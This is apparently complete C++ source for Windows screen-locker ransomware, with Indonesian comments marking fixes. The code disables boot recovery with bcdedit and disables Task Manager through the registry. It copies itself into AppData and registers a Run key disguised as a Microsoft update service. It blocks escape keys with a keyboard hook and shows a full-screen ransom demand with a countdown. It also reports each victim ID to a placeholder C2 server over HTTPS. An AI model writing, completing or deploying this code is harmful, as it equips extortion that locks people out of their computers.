#include <windows.h>
#include <tchar.h>
#include <shlobj.h>
#include <cstdlib>
#include <wininet.h>
#include <string>
#include <time.h> // <-- DIPERBAIKI: Menambahkan header yang hilang untuk fungsi time()

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shell32.lib")

// --- Deklarasi Global ---
HHOOK keyboardHook;
HWND hStaticTitle, hStaticInfo, hStaticTimerLabel, hStaticVictimID;
int countdown = 3600;
#define ID_TIMER 1

// Variabel untuk Font dan ID Korban (Deklarasi pertama yang benar)
HFONT hFontTitle, hFontInfo;
TCHAR victimID[20];

// --- FUNGSI BARU: Pengecekan Hak Akses Administrator ---
bool IsAdmin() {
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup)) {
        if (!CheckTokenMembership(NULL, AdministratorsGroup, &isAdmin)) {
            isAdmin = FALSE;
        }
        FreeSid(AdministratorsGroup);
    }
    return isAdmin == TRUE;
}

// --- FUNGSI DILENGKAPI: Menonaktifkan Opsi Recovery ---
void DisableRecoveryOptions() {
    if (IsAdmin()) {
        system("bcdedit /set {default} bootstatuspolicy ignoreallfailures");
        system("bcdedit /set {default} recoveryenabled no");
    }
}

// --- FUNGSI DILENGKAPI: Persistence dan Aksi Tambahan ---
bool SetupPersistence() {
    // 1. Menonaktifkan Task Manager melalui Registry
    HKEY hKey;
    if (RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD value = 1;
        RegSetValueEx(hKey, TEXT("DisableTaskMgr"), 0, REG_DWORD, (const BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
    }

    // 2. Menyalin diri sendiri ke folder %APPDATA%
    TCHAR currentPath[MAX_PATH];
    TCHAR targetPath[MAX_PATH];

    GetModuleFileName(NULL, currentPath, MAX_PATH);
    SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, targetPath);

    PathAppend(targetPath, TEXT("\\WindowsUpdater"));
    CreateDirectory(targetPath, NULL);
    PathAppend(targetPath, TEXT("\\updater.exe"));

    if (CopyFile(currentPath, targetPath, FALSE)) {
        // 3. Menambahkan ke Registry Run agar otomatis berjalan saat startup
        if (RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            RegSetValueEx(hKey, TEXT("Microsoft Update Service"), 0, REG_SZ, (const BYTE*)targetPath, (_tcslen(targetPath) + 1) * sizeof(TCHAR));
            RegCloseKey(hKey);
            return true;
        }
    }

    return false;
}


// <-- DIPERBAIKI: Menambahkan implementasi fungsi LowLevelKeyboardProc yang hilang -->
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pkbhs = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            // Blok Alt+Tab
            if (pkbhs->vkCode == VK_TAB && (pkbhs->flags & LLKHF_ALTDOWN)) {
                return 1; // Menggagalkan event
            }
            // Blok Alt+F4
            if (pkbhs->vkCode == VK_F4 && (pkbhs->flags & LLKHF_ALTDOWN)) {
                return 1;
            }
            // Blok tombol Windows Kiri dan Kanan
            if (pkbhs->vkCode == VK_LWIN || pkbhs->vkCode == VK_RWIN) {
                return 1;
            }
            // Blok Ctrl+Esc
            if (pkbhs->vkCode == VK_ESCAPE && (GetAsyncKeyState(VK_CONTROL) & 0x8000)) {
                return 1;
            }
            // Blok Ctrl+Shift+Esc (Task Manager)
            if (pkbhs->vkCode == VK_ESCAPE && (GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_SHIFT) & 0x8000)) {
                return 1;
            }
            // Catatan: Ctrl+Alt+Del tidak bisa diblokir oleh hook ini karena merupakan Secure Attention Sequence.
            // Namun, kita sudah menonaktifkan Task Manager melalui registry di SetupPersistence().
        }
    }
    // Teruskan event ke hook selanjutnya dalam rantai
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}


// <-- DIPERBAIKI: Deklarasi ganda ini dinonaktifkan dengan komentar karena sudah dideklarasikan di atas -->
// --- Variabel Global Tambahan untuk Font dan ID Korban ---
// HFONT hFontTitle, hFontInfo;
// TCHAR victimID[20];

// Forward declaration untuk SendStatusToC2 agar bisa dipanggil di WndProc
DWORD WINAPI SendStatusToC2(LPVOID lpParameter);

// --- Window Procedure (LENGKAP DENGAN UI & TIMER) ---
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch(msg) {
        case WM_CREATE: {
            int screenWidth = GetSystemMetrics(SM_CXSCREEN);
            int screenHeight = GetSystemMetrics(SM_CYSCREEN);

            srand(time(NULL));
            wsprintf(victimID, TEXT("VICTIM-ID-%d"), rand() % 9000 + 1000);

            SetClassLongPtr(hwnd, GCLP_HBRBACKGROUND, (LONG_PTR)CreateSolidBrush(RGB(0, 0, 0)));

            hFontTitle = CreateFont(80, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,
                                 CLIP_DEFAULT_PRECIS, ANTIALIASED_QUALITY, VARIABLE_PITCH, TEXT("Arial"));
            hFontInfo = CreateFont(24, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,
                                 CLIP_DEFAULT_PRECIS, ANTIALIASED_QUALITY, VARIABLE_PITCH, TEXT("Courier New"));

            hStaticTitle = CreateWindow(TEXT("static"), TEXT("YOUR SYSTEM HAS BEEN LOCKED"), WS_VISIBLE | WS_CHILD | SS_CENTER,
                                        0, screenHeight / 4, screenWidth, 100, hwnd, NULL, NULL, NULL);
            SendMessage(hStaticTitle, WM_SETFONT, (WPARAM)hFontTitle, TRUE);

            hStaticInfo = CreateWindow(TEXT("static"), TEXT("Your files are safe, but you cannot access your PC.\nTo unlock, you must pay the ransom within the time limit."), WS_VISIBLE | WS_CHILD | SS_CENTER,
                                       0, screenHeight / 2 - 20, screenWidth, 100, hwnd, NULL, NULL, NULL);
            SendMessage(hStaticInfo, WM_SETFONT, (WPARAM)hFontInfo, TRUE);

            hStaticTimerLabel = CreateWindow(TEXT("static"), TEXT("TIME LEFT: 01:00:00"), WS_VISIBLE | WS_CHILD | SS_CENTER,
                                        0, screenHeight / 2 + 80, screenWidth, 100, hwnd, NULL, NULL, NULL);
            SendMessage(hStaticTimerLabel, WM_SETFONT, (WPARAM)hFontTitle, TRUE);

            hStaticVictimID = CreateWindow(TEXT("static"), victimID, WS_VISIBLE | WS_CHILD | SS_CENTER,
                                        0, screenHeight - 100, screenWidth, 50, hwnd, NULL, NULL, NULL);
            SendMessage(hStaticVictimID, WM_SETFONT, (WPARAM)hFontInfo, TRUE);

            SetTimer(hwnd, ID_TIMER, 1000, NULL);
            
            CreateThread(NULL, 0, SendStatusToC2, (LPVOID)victimID, 0, NULL);
            
            break;
        }

        case WM_TIMER: {
            if (wParam == ID_TIMER) {
                countdown--;
                int hours = countdown / 3600;
                int minutes = (countdown % 3600) / 60;
                int seconds = countdown % 60;

                TCHAR timerText[100];
                wsprintf(timerText, TEXT("TIME LEFT: %02d:%02d:%02d"), hours, minutes, seconds);
                SetWindowText(hStaticTimerLabel, timerText);

                if (countdown <= 0) {
                    KillTimer(hwnd, ID_TIMER);
                    SetWindowText(hStaticTimerLabel, TEXT("TIME IS UP!"));
                }
            }
            break;
        }

        case WM_CTLCOLORSTATIC: {
            HDC hdcStatic = (HDC)wParam;
            SetTextColor(hdcStatic, RGB(255, 0, 0));
            SetBkMode(hdcStatic, TRANSPARENT);
            return (LRESULT)GetStockObject(NULL_BRUSH);
        }

        case WM_CLOSE:
            DestroyWindow(hwnd);
            break;

        case WM_DESTROY:
            KillTimer(hwnd, ID_TIMER);
            DeleteObject(hFontTitle);
            DeleteObject(hFontInfo);
            PostQuitMessage(0);
            break;

        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}


// --- FITUR JARINGAN C2 (IMPLEMENTASI LENGKAP) ---
DWORD WINAPI SendStatusToC2(LPVOID lpParameter) {
    TCHAR* victimId = (TCHAR*)lpParameter;

    LPCWSTR server = L"your-c2-server.com"; // GANTI DENGAN ALAMAT SERVER ANDA
    LPCWSTR path = L"/api/status";           // GANTI DENGAN ENDPOINT/PATH ANDA

    std::wstring jsonData = L"{\"victim_id\":\"" + std::wstring(victimId) + L"\", \"status\":\"infected\"}";
    
    HINTERNET hInternet = NULL, hConnect = NULL, hRequest = NULL;
    BOOL bResults = FALSE;

    hInternet = InternetOpen(L"WindowsUpdate/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        return 1;
    }

    hConnect = InternetConnect(hInternet, server, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (hConnect == NULL) {
        InternetCloseHandle(hInternet);
        return 2;
    }

    hRequest = HttpOpenRequest(hConnect, L"POST", path, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
    if (hRequest == NULL) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 3;
    }

    LPCWSTR headers = L"Content-Type: application/json";
    std::string dataToSend(jsonData.begin(), jsonData.end());

    bResults = HttpSendRequest(hRequest, headers, -1L, (LPVOID)dataToSend.c_str(), dataToSend.length());
    
    if (hRequest) InternetCloseHandle(hRequest);
    if (hConnect) InternetCloseHandle(hConnect);
    if (hInternet) InternetCloseHandle(hInternet);

    if (!bResults) {
        return 4;
    }

    return 0;
}

// <-- DIPERBAIKI: Definisi fungsi WndProc ganda ini dinonaktifkan dengan komentar karena sudah ada di atas -->
// --- Window Procedure (Tidak Berubah) ---
// LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) { /* ... kode tidak berubah, sama seperti sebelumnya ... */ return 0; }

// --- Titik Masuk Utama (WinMain) ---
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    DisableRecoveryOptions();
    if (!SetupPersistence()) {
        // Lanjutkan eksekusi meskipun persistence gagal
    }

    WNDCLASSEX wc;
    HWND hwnd;
    MSG Msg;

    wc.cbSize        = sizeof(WNDCLASSEX);
    wc.style         = 0;
    wc.lpfnWndProc   = WndProc;
    wc.cbClsExtra    = 0;
    wc.cbWndExtra    = 0;
    wc.hInstance     = hInstance;
    wc.hIcon         = LoadIcon(NULL, IDI_APPLICATION);
    wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
    wc.lpszMenuName  = NULL;
    wc.lpszClassName = TEXT("LockerWindowClass");
    wc.hIconSm       = LoadIcon(NULL, IDI_APPLICATION);

    if(!RegisterClassEx(&wc)) {
        MessageBox(NULL, TEXT("Window Registration Failed!"), TEXT("Error!"), MB_ICONEXCLAMATION | MB_OK);
        return 0;
    }

    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    hwnd = CreateWindowEx(
        WS_EX_TOPMOST,
        TEXT("LockerWindowClass"),
        TEXT("System Lock"),
        WS_POPUP,
        0, 0, screenWidth, screenHeight,
        NULL, NULL, hInstance, NULL);

    if(hwnd == NULL) {
        MessageBox(NULL, TEXT("Window Creation Failed!"), TEXT("Error!"), MB_ICONEXCLAMATION | MB_OK);
        return 0;
    }

    ShowWindow(hwnd, SW_SHOW);
    UpdateWindow(hwnd);

    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInstance, 0);

    while(GetMessage(&Msg, NULL, 0, 0) > 0) {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }

    UnhookWindowsHookEx(keyboardHook);
    return (int)Msg.wParam;
}
